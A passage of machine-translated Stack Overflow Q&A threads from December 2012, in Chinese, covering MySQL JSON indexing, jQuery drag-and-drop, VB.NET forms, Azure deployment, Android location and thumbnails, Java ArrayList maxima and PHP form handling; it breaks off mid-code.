> 赞同：0
> 
> 时间：2012-12-07T02:55:44.233
> 
> 标签：mysql, json, indexing

我的数据库是 MySQL，我发现没有 JSON 类型，只有文本。但在我的情况下，我需要存储 JSON 含义的数据并在 JSON 数据的哈希键上使用索引。所以“文本”类型不是正确的方法。顺便说一句，我无法将 JSON 数据分成不同的列，因为我不知道 JSON 中的键是什么。

我真正需要的是一个解决方案，通过 MySQL 中的 JSON 键使用 index 或 sth 搜索 JSON 数据，因此搜索速度可以快速且可以接受。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-21T09:16:56.527

如果您无法将数据标准化为 RDBMS 可读格式，则不应使用 MySQL。

noSQL 数据库可能是更好的方法。MySQL 的优势在于处理关系数据。

您正在尝试通过圆孔安装方形物体:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-21T09:16:24.353

我认为您的情况需要[Levenshtein Distance 算法](http://en.wikipedia.org/wiki/Levenshtein_distance)。您基本上需要使用文本片段（针）对未知数量（大海捞针）进行文本搜索。而且你需要它快速，因为索引是不可能的。

MySQL 有一个鲜为人知（或无论如何很少使用）的功能，您可以通过它创建[User-Defined Functions](http://dev.mysql.com/doc/refman/5.1/en/adding-udf.html)。该函数本身是一个存储过程，为了提高速度，它可以用 C++ 编译。UDF 在您的查询中本机使用，就好像它们是常规 MySQL 语法的一部分一样。

以下是在 MySQL中实现[Levenshtein 用户定义函数的详细信息。](http://samjlevy.com/2011/03/mysql-levenshtein-and-damerau-levenshtein-udfs/)

一个示例查询可能是...

```
SELECT json FROM my_table WHERE levenshtein('needle') < 5; 
```

指的`5`是“编辑距离”，实际上允许定位近匹配。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-08T01:42:00.400

`select concat('{"objects\":[' ,(select group_concat( concat('{"id":"',id, '","field":"',field,'"}') separator ',') from placeholder) ,']}');`

任何更通用的东西都需要动态 sql

# javascript - 可放置在彩色背景上

> ID：13756254
> 
> 赞同：0
> 
> 时间：2012-12-07T02:55:54.403
> 
> 标签：javascript, jquery, html, css

我将如何更改以下代码，以便只有黄色背景的单元格可以删除？

有没有一种简单的方法可以做到这一点，还是我必须重新编码整个 jquery？谢谢。

小提琴：http: [//jsfiddle.net/bLb3H/38/](http://jsfiddle.net/bLb3H/38/)

html:

```
<table border="1" id="tbl">
 <tr>
  <td ></td>
  <td  bgcolor=#000000 ></td>
  <td class="items  p1 p3"><img src="http://icons.iconarchive.com/icons/deleket/soft- scraps/32/Button-Blank-Red-icon.png"/></td>      
</tr>

<tr>      
  <td bgcolor=#000000 ></td>
  <td class="items  p1"></td>
  <td class="items p3" bgcolor=#000000 ></td>
</tr>

<tr>      
  <td class="piece" id="p1" ><img src="http://icons.iconarchive.com/icons/deleket/soft-scraps/32/Button-Blank-Gray-icon.png"></td>
  <td bgcolor=#000000 ></td>
  <td class="piece" id="p3" ><img src="http://icons.iconarchive.com/icons/deleket/soft-scraps/32/Button-Blank-Gray-icon.png" ></td>
</tr> 
```

jQuery

```
$('img').draggable({
});

$('#tbl td').droppable({
hoverClass: 'over',
drop: function(event, ui) {
    $(this).children('img').remove();
    var cell = ui.draggable.appendTo($(this)).css({
        'left': '0',
        'top': '0'
    });

  $('img').draggable('disable');

$("td").each(function() {
var id = $(this).attr("id");
    $("."+id).css("background", "");        
  });

}
});

$(".piece").mouseover(function() {
id = $(this).attr('id');
$("."+id).css("background", "yellow");
}).mouseleave(function() {
id = $(this).attr('id');
$("."+id).css("background", "");       
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T07:35:39.980

You have different ways to achieve this:

### Short version

```
//All elements with yellow background
$('#tbl td[style*=background-color:yellow]').droppable(); 
```

### Using filter

```
$(function() {
    $('#tbl td').filter(function () {
        return $(this).css('background-color') == 'yellow';
    }).droppable();
}); 
```

### Using find:

```
jQuery('#tbl').find('td').each(function (){
    if($(this).css('background-color') == 'yellow'){
       // do something like $(this).droppable();
    }
}); 
```

# .net - 从外部类设置文本值

> ID：13756256
> 
> 赞同：0
> 
> 时间：2012-12-07T02:55:58.817
> 
> 标签：.net, vb.net

我正在尝试从一个单独的类修改应用程序启动表单上的控件，该类是从启动表单中按钮的事件处理程序实例化的。

这是主窗体中的点击监听器：

```
Sub Button1Click(sender As Object, e As EventArgs)
    Dim changer As New Changer()
    changer.dochange

End Sub 
```

这是类转换器：

```
Public Class Changer
Sub dochange
    'ignore this part
    Dim window As Form1
    window = New Form1()
    window.Show

          'this is where i have a problem:
    Dim bunz As MainForm
    bunz = New MainForm()
    bunz.label1.Text = "sometext"
End Sub
 End Class 
```

我什至设置了我的 label1 以便它是公开的，但文本仍然不会改变。怎么了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T05:29:37.047

您遇到的问题是因为您正在创建第二个 Mainform 并更改第二个而不是原始的标签文本。您需要做的是为您的 Changer Class 创建一个事件并在 MainForm 中订阅它并使用它来更改标签的 Text

**正文**

```
Public Class MainForm

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        Dim changer As New Changer()
        AddHandler changer.ChangeText, AddressOf ChangeTextHandler
        changer.dochange()
    End Sub

    Private Sub ChangeTextHandler(value As String)
        Label1.Text = value
    End Sub

End Class 
```

**换班**

```
Public Class Changer
    Public Event ChangeText(value As String)
    Sub dochange()
        'ignore this part
        Dim window As Form1
        window = New Form1()
        window.Show()
        RaiseEvent ChangeText("SomeText")
    End Sub
End Class 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T17:18:19.217

这正是我想要的。我想从另一个班级清除表格上的状态条标签。在表单中我添加了 AddHandler otherClass.ChangeText、AddressOf ChangeTextHandler 和子 ChangeTextHandler。在 otherClass 我做了 RaiseEvent ChangeText(" ") 并且它起作用了。谢谢你！谢谢你！有一件事，我一直对共享的访问感到温暖......将被忽略。我将事件定义为 Public Shared Event ChangeText(value As String) 并且没有更多问题。很高兴这里有一些非常聪明的人。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-07T03:14:47.373

下面的代码示例应该可以工作。在 VB 中，您并不总是需要显式声明或引用您尝试修改的表单。如果它已作为主窗体打开或使用 Shared ShowDialog 方法打开，那么您可以在这种情况下将 Label1 引用为窗体的共享属性。无需创建单独的实例。

```
Public Class MainForm
    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        Dim changer As New Changer()
        changer.dochange()
    End Sub
End Class

Public Class Changer
    Sub dochange()
        'ignore this part
        Dim window As Form1
        window = New Form1()
        window.Show()

        'this is where i have a problem:
        MainForm.Label1.Text = "sometext"
    End Sub
End Class 
```

以上是在两个单独的文件中，一个是通过添加 Windows 窗体从 Visual Studio 创建的 MainForm.vb 文件，另一个是通过添加类创建的。

# azure - Azure：按需快速启动大型应用程序？

> ID：13756259
> 
> 赞同：1
> 
> 时间：2012-12-07T02:56:17.400
> 
> 标签：azure

我真的不明白云服务是如何工作的。特别是我想知道是否有可能：

只需一次上传一个大型应用程序 (>1GB) 并支付很少的费用（仅用于存储），并根据需要快速生成它的实例（最多几分钟的启动时间）。因此，只有在应用程序真正运行并且不必每次停止/启动时都再次上传时才需要付费。

谢谢！问候，soacc32

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T04:45:01.187

这样做当然是可能的。事实上，这就是云服务部署的工作方式。从本地计算机部署应用程序时，首先将应用程序包文件上传到 Blob 存储，然后从那里进行部署。您可以在 blob 存储中单独上传包，当您想要创建部署时，您只需指定 blob URL。因此，如果您使用门户创建部署，对于包文件和配置文件位置，您将选择“FROM STORAGE”而不是“FROM LOCAL”，如下面的屏幕截图所示。

![在此处输入图像描述](../Images/b35eb0d8caa112060f99f322641a75b2.png)

希望这可以帮助。

# android - 如何在 Google Maps Android API v2 中获取当前位置？

> ID：13756261
> 
> 赞同：44
> 
> 时间：2012-12-07T02:56:32.120
> 
> 标签：android, google-maps

使用

```
mMap.setMyLocationEnabled(true) 
```

可以设置 myLocation 层启用。
但问题是当用户点击按钮时如何获取 myLocation ？我想得到经度和纬度。

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2014-05-29T22:17:36.677

Google Maps API 位置现在可以工作，甚至有监听器，您可以使用它来实现，例如：

```
private GoogleMap.OnMyLocationChangeListener myLocationChangeListener = new GoogleMap.OnMyLocationChangeListener() {
    @Override
    public void onMyLocationChange(Location location) {
        LatLng loc = new LatLng(location.getLatitude(), location.getLongitude());
        mMarker = mMap.addMarker(new MarkerOptions().position(loc));
        if(mMap != null){
            mMap.animateCamera(CameraUpdateFactory.newLatLngZoom(loc, 16.0f));
        }
    }
}; 
```

然后为地图设置监听器：

```
mMap.setOnMyLocationChangeListener(myLocationChangeListener); 
```

这将在地图首次找到该位置时被调用。

根本不需要 LocationService 或 LocationManager。

> `OnMyLocationChangeListener`接口已弃用。请改用 com.google.android.gms.location.FusedLocationProviderApi。FusedLocationProviderApi 提供改进的位置查找和电源使用，并由“我的位置”蓝点使用。请参阅示例应用程序文件夹中的 MyLocationDemoActivity 以获取示例代码或位置开发人员指南。

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2012-12-12T00:01:44.307

目前 GoogleMap.getMyLocation() 在任何情况下总是返回 null 。

据我所知，目前有两个针对 Google 的错误报告，[Issue 40932](http://code.google.com/p/android/issues/detail?id=40932#)和[Issue 4644](http://code.google.com/p/gmaps-api-issues/issues/detail?id=4644)。

像前面提到的那样实现 LocationListener 是不正确的，因为 LocationListener 将与您尝试使用的新 API 中的 LocationOverlay 不同步。

按照之前由 Pramod J George 链接的 Vogella 网站上的教程，将为您提供有关旧版 Google Maps API 的说明。

因此，对于没有为您提供通过这种方式检索您的位置的方法，我深表歉意。目前，locationListener 可能是唯一的方法，但我确信 Google 正在努力解决新 API 中的问题。

也很抱歉没有发布更多链接，StackOverlow 认为我是垃圾邮件，因为我没有代表。

---- 2013 年 2 月 4 日更新 ----

谷歌表示，该问题将在下次更新 Google Maps API 时通过 [Issue 4644](http://code.google.com/p/gmaps-api-issues/issues/detail?id=4644)修复。我不确定什么时候会更新，但一旦更新，我会再次编辑这篇文章。

---- 2013年4月10日更新----

谷歌表示该问题已通过 [Issue 4644](http://code.google.com/p/gmaps-api-issues/issues/detail?id=4644)得到修复。它现在应该可以工作了。

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2013-01-24T03:16:30.730

尝试这个

```
LocationManager service = (LocationManager) getSystemService(LOCATION_SERVICE);
Criteria criteria = new Criteria();
String provider = service.getBestProvider(criteria, false);
Location location = service.getLastKnownLocation(provider);
LatLng userLocation = new LatLng(location.getLatitude(),location.getLongitude()); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2014-11-28T16:23:57.420

确保您已打开设备上的定位服务。否则，您将不会获得任何与位置相关的信息。

这对我有用，

```
 map = ((MapFragment)getFragmentManager().findFragmentById(R.id.map)).getMap();
    map.setMyLocationEnabled(true);
    GoogleMap.OnMyLocationChangeListener myLocationChangeListener = new GoogleMap.OnMyLocationChangeListener() {
        @Override
        public void onMyLocationChange (Location location) {
           LatLng loc = new LatLng (location.getLatitude(), location.getLongitude());
           map.animateCamera(CameraUpdateFactory.newLatLngZoom(loc, 16.0f));
        }
    };
    map.setOnMyLocationChangeListener(myLocationChangeListener); 
```

}

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-03-08T11:06:30.503

要获取用户单击按钮时的位置，请在 onClick- 中调用此方法

```
void getCurrentLocation() {
    Location myLocation  = mMap.getMyLocation();
    if(myLocation!=null)
    {
        double dLatitude = myLocation.getLatitude();
        double dLongitude = myLocation.getLongitude();
        Log.i("APPLICATION"," : "+dLatitude);
        Log.i("APPLICATION"," : "+dLongitude);
        mMap.addMarker(new MarkerOptions().position(
                new LatLng(dLatitude, dLongitude)).title("My Location").icon(BitmapDescriptorFactory.fromBitmap(Utils.getBitmap("pointer_icon.png"))));
        mMap.moveCamera(CameraUpdateFactory.newLatLngZoom(new LatLng(dLatitude, dLongitude), 8));

    }
    else
    {
        Toast.makeText(this, "Unable to fetch the current location", Toast.LENGTH_SHORT).show();
    }

} 
```

还要确保

> setMyLocationEnabled

设置为**true**。

试试看这是否有效...

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2014-12-23T10:09:40.763

我刚刚发现此代码片段简单实用，请尝试：

```
public class MainActivity extends ActionBarActivity implements
    ConnectionCallbacks, OnConnectionFailedListener {
...
@Override
public void onConnected(Bundle connectionHint) {
    mLastLocation = LocationServices.FusedLocationApi.getLastLocation(
            mGoogleApiClient);
    if (mLastLocation != null) {
        mLatitudeText.setText(String.valueOf(mLastLocation.getLatitude()));
        mLongitudeText.setText(String.valueOf(mLastLocation.getLongitude()));
    }
}} 
```

这是教程的链接：[获取最后一个已知位置](http://developer.android.com/training/location/retrieve-current.html)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-12-07T06:33:24.423

你试过[`GoogleMap.getMyLocation()`](https://developers.google.com/maps/documentation/android/reference/com/google/android/gms/maps/GoogleMap#getMyLocation%28%29)吗？

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2016-06-06T17:54:00.320

尝试这个

```
if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED) {
    mMap.setMyLocationEnabled(true);
} else {
    // Show rationale and request permission.
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-12-07T07:03:53.573

尝试这个

```
public class MyLocationListener implements LocationListener
{

 @Override

public void onLocationChanged(Location loc)
{

loc.getLatitude();

loc.getLongitude();

String Text = “My current location is: ” +

“Latitud = ” + loc.getLatitude() +

“Longitud = ” + loc.getLongitude();

Toast.makeText( getApplicationContext(),Text,   Toast.LENGTH_SHORT).show();

tvlat.setText(“”+loc.getLatitude());

tvlong.setText(“”+loc.getLongitude());

this.gpsCurrentLocation();

} 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2015-02-17T21:52:01.123

只有一个条件，我测试它不为空，如果您允许用户有足够的时间触摸“获取我的位置”图层按钮，那么它将不会获得空值。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2014-09-30T14:11:55.270

它将给出当前位置。

```
mMap.setMyLocationEnabled(true);
Location userLocation = mMap.getMyLocation();
        LatLng myLocation = null;
        if (userLocation != null) {
            myLocation = new LatLng(userLocation.getLatitude(),
                    userLocation.getLongitude());
            mMap.animateCamera(CameraUpdateFactory.newLatLngZoom(myLocation,
                    mMap.getMaxZoomLevel()-5)); 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2017-04-09T08:26:43.810

接受的答案有效，但现在不推荐使用一些使用的方法，所以我认为最好用更新的方法回答这个问题。

这是答案完全来自[谷歌开发者指南](https://developers.google.com/maps/documentation/android-api/current-place-tutorial#get-the-location-of-the-android-device-and-position-the-map)

所以这里是一步一步的指南：

1.  在您的地图活动中实现所有这些

    `MapActivity extends FragmentActivity implements OnMapReadyCallback, GoogleApiClient.OnConnectionFailedListener, GoogleApiClient.ConnectionCallbacks`

2.  在你的`onCreate`：

    ```
    private GoogleMap mMap;
    private Context context;
    private TextView txtStartPoint,txtEndPoint;
    private GoogleApiClient mGoogleApiClient;
    private Location mLastKnownLocation;
    private LatLng mDefaultLocation;
    private CameraPosition mCameraPosition;
    private boolean mLocationPermissionGranted;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_maps);
    context = this;
    mGoogleApiClient = new GoogleApiClient.Builder(this)
            .enableAutoManage(this /* FragmentActivity */,
                    this /* OnConnectionFailedListener */)
            .addConnectionCallbacks(this)
            .addApi(LocationServices.API)
            .addApi(Places.GEO_DATA_API)
            .addApi(Places.PLACE_DETECTION_API)
            .build();
    mGoogleApiClient.connect();
    } 
    ```

3.  在你的`onConnected`：

    ```
    SupportMapFragment mapFragment = (SupportMapFragment)     getSupportFragmentManager()
            .findFragmentById(map);
    mapFragment.getMapAsync(this); 
    ```

4.  在你的`onMapReady`：

    ```
    @Override
    public void onMapReady(GoogleMap googleMap) {
    mMap = googleMap;

    // Do other setup activities here too, as described elsewhere in this tutorial.

    // Turn on the My Location layer and the related control on the map.
    updateLocationUI();

    // Get the current location of the device and set the position of the map.
    getDeviceLocation();
    } 
    ```

5.  这两个是方法`onMapReady`：

    ```
    private void updateLocationUI() {
      if (mMap == null) {
        return;
    }

    if (ContextCompat.checkSelfPermission(this.getApplicationContext(),
            android.Manifest.permission.ACCESS_FINE_LOCATION)
            == PackageManager.PERMISSION_GRANTED) {
        mLocationPermissionGranted = true;
    }

    if (mLocationPermissionGranted) {
        mMap.setMyLocationEnabled(true);
        mMap.getUiSettings().setMyLocationButtonEnabled(true);
    } else {
        mMap.setMyLocationEnabled(false);
        mMap.getUiSettings().setMyLocationButtonEnabled(false);
        mLastKnownLocation = null;
    }
    }

    private void getDeviceLocation() {
    if (ContextCompat.checkSelfPermission(this.getApplicationContext(),
            android.Manifest.permission.ACCESS_FINE_LOCATION)
            == PackageManager.PERMISSION_GRANTED) {
        mLocationPermissionGranted = true;
    }

    if (mLocationPermissionGranted) {
        mLastKnownLocation = LocationServices.FusedLocationApi
                .getLastLocation(mGoogleApiClient);
    }

    // Set the map's camera position to the current location of the device.
    float DEFAULT_ZOOM = 15;
    if (mCameraPosition != null) {
        mMap.moveCamera(CameraUpdateFactory.newCameraPosition(mCameraPosition));
    } else if (mLastKnownLocation != null) {
        mMap.moveCamera(CameraUpdateFactory.newLatLngZoom(
                new LatLng(mLastKnownLocation.getLatitude(),
                        mLastKnownLocation.getLongitude()), DEFAULT_ZOOM));
    } else {
        Log.d("pouya", "Current location is null. Using defaults.");
        mMap.moveCamera(CameraUpdateFactory.newLatLngZoom(mDefaultLocation, DEFAULT_ZOOM));
        mMap.getUiSettings().setMyLocationButtonEnabled(false);
    }
    } 
    ```

这是非常快速、流畅和有效的。希望这可以帮助

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2017-07-04T14:14:11.093

我宁愿使用`FusedLocationApi`因为`OnMyLocationChangeListener`已弃用。

首先声明这 3 个变量：

```
private LocationRequest  mLocationRequest;
private GoogleApiClient  mGoogleApiClient;
private LocationListener mLocationListener; 
```

定义方法：

```
private void initGoogleApiClient(Context context)
{
    mGoogleApiClient = new GoogleApiClient.Builder(context).addApi(LocationServices.API).addConnectionCallbacks(new GoogleApiClient.ConnectionCallbacks()
    {
        @Override
        public void onConnected(Bundle bundle)
        {
            mLocationRequest = LocationRequest.create();
            mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
            mLocationRequest.setInterval(1000);

            setLocationListener();
        }

        @Override
        public void onConnectionSuspended(int i)
        {
            Log.i("LOG_TAG", "onConnectionSuspended");
        }
    }).build();

    if (mGoogleApiClient != null)
        mGoogleApiClient.connect();

}

private void setLocationListener()
{
    mLocationListener = new LocationListener()
    {
        @Override
        public void onLocationChanged(Location location)
        {
            String lat = String.valueOf(location.getLatitude());
            String lon = String.valueOf(location.getLongitude());
            Log.i("LOG_TAG", "Latitude = " + lat + " Longitude = " + lon);
        }
    };

    LocationServices.FusedLocationApi.requestLocationUpdates(mGoogleApiClient, mLocationRequest, mLocationListener);
}

private void removeLocationListener()
{
    LocationServices.FusedLocationApi.removeLocationUpdates(mGoogleApiClient, mLocationListener);
} 
```

*   `initGoogleApiClient()`用于初始化`GoogleApiClient`对象
*   `setLocationListener()`用于设置位置变化监听器
*   `removeLocationListener()`用于移除监听器

调用`initGoogleApiClient`方法开始代码工作:) 不要忘记在`mLocationListener`最后删除监听器（）以避免内存泄漏问题。

# java - 在 ArrayList 中查找 Max Number(s)（可能有多个最大值）

> ID：13756268
> 
> 赞同：2
> 
> 时间：2012-12-07T02:57:43.123
> 
> 标签：java, arraylist

我想找到在`ArrayList`. 我想保留数字所在的顺序（换句话说，没有排序），因为我想跟踪哪个索引具有什么值。这些值来自随机数生成器，并且可能有两个（或更多）索引共享相同的最大值。

一个例子`ArrayList`：

> 12、78、45、78
> 
> 0,1,2,3 <- 索引

（所以索引 1 和 3 包含具有最大值的值。我想保持索引 1 和 3 的值是 78 的事实。我不想只创建一个新的`ArrayList`并拥有新的索引 0 和 1`ArrayList`有值 78)

因此，我想找到所有具有最大值的索引，因为如果有多个索引，我将对它们做一些事情来“打破”平局。那么如何找到包含最大值的索引并保持索引到值的关系呢？

我写了以下方法：

```
public static ArrayList<Integer> maxIndices(ArrayList<Integer> numArrayList) {
// ???  
    return numArrayList;
}

public static void removeElement(ArrayList<Integer> numArrayList, int index) {
    numArrayList.remove(index);
}

public static int getMaxValue(ArrayList<Integer> numArrayList) {
    int maxValue = Collections.max(numArrayList);
    return maxValue;
}

public static int getIndexOfMaxValue(ArrayList<Integer> numArrayList, int maxVal) {
    int index = numArrayList.indexOf(maxVal);
    return index;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T03:09:44.427

```
public static ArrayList<Integer> maxIndices(ArrayList<Integer> list) {
    List<Integer> indices = new ArrayList<Integer>();
    int max =  getMaxValue(list);
    for (int i = 0; i < list.size(); i++) {
       if(list.get(i) == max) {
           indices.add(list.get(i));
        }
     }

     return indices;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T05:11:55.090

O(n) 解决方案：

```
 public static List<Integer> maxIndices(List<Integer> l) {
        List<Integer> result = new ArrayList<Integer>();
        Integer candidate = l.get(0);
        result.add(0);

        for (int i = 1; i < l.size(); i++) {
            if (l.get(i).compareTo(candidate) > 0) {
                candidate = l.get(i);
                result.clear();
                result.add(i);
            } else if (l.get(i).compareTo(candidate) == 0) {
                result.add(i);
            }
        }
        return result;
    } 
```

# python - 更小的应用程序占用空间是否意味着更便宜的 PaaS 成本？哪种语言？

> ID：13756269
> 
> 赞同：4
> 
> 时间：2012-12-07T02:57:47.893
> 
> 标签：python, ruby, node.js, grails, cloud

因此，我在 cloudfoundry 上构建并部署了一个 Grails 应用程序。

当我玩弄检查实例和内存时，我开始怀疑；

如果由于我选择开发应用程序的技术而导致我的应用程序占用空间更大，它是否会迟早开始让我花钱？一定要吗？

如果是这种情况，我是否最好用另一种语言进行开发？如果是这样，哪个占用空间更小（python、ruby、node.js）？

当然，成本不应该决定我使用哪种语言，我应该根据优点和个人喜好选择语言/框架。

但这仍然是一个我真的很想知道答案的问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:17:31.280

在选择框架时，内存占用很少是一个问题。如果我们如此担心，我们将使用手动汇编代码，将所有内容都积极压缩到内存中，就像一些[演示场景](http://en.wikipedia.org/wiki/Demoscene)编码器一样。显然情况并非如此。

即使是负载相当重的 Rails，每个实例也只会使用约 100MB。512MB 实例每月大约需要 20 美元，考虑到操作系统开销，每个实例的净成本最终约为 5 美元。

花费多少程序员的时间才能最终让您花费更多，而不是简单地购买容量更大的系统？可能很多，除非你的时间是空闲的。

请记住，您始终可以以使用托管提供商的一小部分成本租用自己的硬件，其中具有 64GB 内存的系统可以以低于 500 美元/月的价格获得。最后，即使是每个月的一小部分程序员，也几乎无法支付。

我会注意给定的开发人员可以使用您选择的框架完成多少工作。有些框架会更好地为您工作，让您执行得更好。有时，为额外的内存付费是一种抵消将更多时间投入到开发和优化上的方式，在您处理每月数以万计的服务器账单之前，这通常为时过早。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T03:05:47.753

内存占用肯定会反映在您的 PaaS 费用上。但是如果不了解项目的更多信息，就很难告诉您使用什么。Node.js 本身很棒，但并不适合所有情况。Python 对开发非常友好，内存使用也不错，但同样 - 这完全取决于你在做什么。

# twitter-bootstrap - IE7 中的引导选项卡

> ID：13756271
> 
> 赞同：1
> 
> 时间：2012-12-07T02:58:01.313
> 
> 标签：twitter-bootstrap, tabs, internet-explorer-7, jquery-ui-tabs

我正在创建一个类似于维基百科的网页。我正在使用 Twitter Bootstrap。

为了设计一个选项卡，我使用引导程序，如 url [Bootstrap Tabs](http://twitter.github.com/bootstrap/javascript.html#tabs)

在 IE7 中，我的标签如下所示

![IE7 标签](../Images/4149511f821aba18aa4db5753f1367e2.png)

在 Chrome 中它看起来很棒

![铬标签](../Images/331885f46b83720e701090b1cfa92bfb.png)

请帮忙

代码

![在此处输入图像描述](../Images/78a451d09e7d5c8a69e6fd65ebe77023.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T08:20:54.803

您在屏幕截图中发布的代码给了我以下输出..

![在此处输入图像描述](../Images/981562ef68f4e7321ec31937a7b5722e.png)

您可以在清除浏览器缓存后检查问题是否仍然存在。

我只使用

```
<link rel="stylesheet" type="text/css" href="bootstrap.css" /> 
```

并且没有其他*css*或*js*文件..

# android - Android应用程序如何从网络正确加载图像缩略图

> ID：13756280
> 
> 赞同：1
> 
> 时间：2012-12-07T02:59:28.490
> 
> 标签：android, sdk, loading, android-image

所以我试图从网上加载一堆缩略图（可能高达 100+），我似乎在模拟器上的内存不足 30 左右，手机本身的内存在 80-85 左右。

这是行不通的，但必须有一种方法-

我什至尝试将图像保存到缓存内存并从那里加载，但它仍然内存不足。

加载大量网络缩略图的正确方法是什么？

每张图片大约 50 kb，我基本上是通过我制作的名为 CreateImage 的方法动态添加 imageViews。这几乎可以根据 URL 和图像名称加载每个缩略图，并将其设置在 Horizo​​ntalScollView 中的动态 imageView 中。

```
 private void createImages(String URL, String imageName){
    ImageView ImageThumbnails = new ImageView(this);
    ImageThumbnails.setId(ImageThumbName);
    ImageThumbnails.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT)); 
    ImageThumbnails.getLayoutParams().height = 85;
    ImageThumbnails.getLayoutParams().width = 85;
    ImageThumbnails.setPadding(4, 4, 4, 4);
    ImageThumbnails.setScaleType(ImageView.ScaleType.FIT_XY);
    ImageThumbnails.setOnClickListener(this);

    String path = Environment.getExternalStorageDirectory()+ "/" + imageName;
    File imgFile = new File(path);
    if(imgFile.exists())
    {
      Bitmap myBitmap = BitmapFactory.decodeFile(imgFile.getAbsolutePath());
      Bitmap bmpCompressed = Bitmap.createScaledBitmap(myBitmap, 85, 85, true);
      ImageThumbnails.setImageBitmap(bmpCompressed);

    }

    ll.addView(ImageThumbnails);
} 
```

提前致谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T03:05:07.503

您应该阅读 Android 门户上的那些文章，这些文章准确地解释了如何做到这一点并提供代码：

显示位图：http: [//developer.android.com/training/displaying-bitmaps/index.html](http://developer.android.com/training/displaying-bitmaps/index.html)

加载大位图：http: [//developer.android.com/training/displaying-bitmaps/load-bitmap.html](http://developer.android.com/training/displaying-bitmaps/load-bitmap.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T03:05:51.770

使用 AsyncTask 单独下载每个图像并将其保存到磁盘（单独）。这就是我为杂志应用程序制作 30 多张图片所做的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T03:06:02.233

我认为您的问题将得到解决`lazy list adapter`。试试这个例子[LazyList](https://github.com/thest1/LazyList)

# android - Android Boots-Up 时需要建议执行任务

> ID：13756281
> 
> 赞同：1
> 
> 时间：2012-12-07T02:59:39.067
> 
> 标签：android

我编写了一个活动 A，当用户按下按钮时，它将执行 MyConfig.doSomething() ，其中 MyConfig 是简单的类，活动 A 传递给它。

```
public class A extends PreferenceActivity {
    private MyConfig mMyConfig;

    /* pseudo code, when button clicked, call */        
    mMyConfig.doSomething();
} 
```

在 mMyConfig 中，它访问 SharedPreferences 以进行某些配置。因此，我可以这样做将活动传递给 mMyConfig 以调用 getSharedPreferences()。

```
mMyConfig = new MyConfig ( this ); 
```

我的请求来了：

我想做一些`MyConfig.doSomething()`已经做过的事情，但是除非用户单击某个按钮来调用它，否则我想在 Android Boots-Up 时调用它。

我可以编写另一个类来扩展 BroadcastReceiver，然后通过调用启动活动 A `startActivity(A.class)`，然后在 A 中执行一些技巧来`mMyConfig.doSomething()`实现。它可以工作，但是当 Android 启动时，应用程序将显示在屏幕上。

我想在`mMyConfig.doSomething()`不让用户知道的情况下隐式发生。我想有两种可能的解决方案，但我不知道该怎么做。

解决方案A：编写一个扩展BroadcastReceiver的类，启动一个读取A的SharedPreferences的服务（而不是活动A）并创建MyConfig对象来做`doSomething()`。但是，如果活动本身从未启动，我不知道这是否可行，我怎么能这样做（从服务中读取 SharedPreferences）？

方案B：写一个扩展BroadcastReceiver的类，启动ActivityA不显示，调用`startActivity(A.class)`onReceive放入Activity栈。这可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T03:04:36.430

您可以让您的 BoardcastReceiver 代替对用户可见的 Activity，而`Service`不是启动一个。它旨在在不打扰用户的情况下在后台执行任务。[官方指南是一个不错的起点。](http://developer.android.com/guide/components/services.html)

**编辑：**

要访问应用程序的 SharedPreference，只需在服务中调用此行：

`SharedPreferences pref = PreferenceManager.getSharedPreferences();`

# php - 用于处理多个表单提交的单个 PHP 文件是否被视为“错误表单”？

> ID：13756282
> 
> 赞同：0
> 
> 时间：2012-12-07T02:59:44.457
> 
> 标签：php, html, forms

我在一个小网站（研究生班的项目）上工作，我有一堆收集数据并将其传递给 MySQL 数据库的 html 表单。目前，每个表单（大多数存在于单独的页面上）调用不同的 php 文件作为表单操作。随着网站的发展，这变得有点混乱。拥有一个所有表单在提交时调用的单个 php 文件，然后在该 php 文件中使用 switch 语句来确定要执行的代码块是常见的还是可接受/推荐的方法？

如果是这样，我是否想在我的表单中使用隐藏的输入类型来指示要运行哪个 switch case，例如在我的表单中：

```
<input type="hidden" name="my_case" value="add_user"> 
```

...

在我的 php 文件中：

```
switch($_POST['my_case']) {

case 'add_user':
